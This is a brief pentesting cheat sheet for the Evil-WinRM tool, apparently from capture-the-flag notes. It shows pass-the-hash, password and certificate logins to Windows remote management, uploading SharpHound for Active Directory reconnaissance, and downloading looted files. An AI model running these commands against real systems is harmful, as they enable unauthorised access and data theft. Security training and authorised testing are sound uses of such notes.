https://github.com/Hackplayers/evil-winrm
## Evil-WinRM
```bash
# Login with Hash
evil-winrm -i 192.168.100.101 -u username -H hash

# Login with Password
evil-winrm -i ghost.htb -u username -p '1S@t'

# Login with .pem
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S

# File Transfers
upload SharpHound.exe

download megaloot.zip
```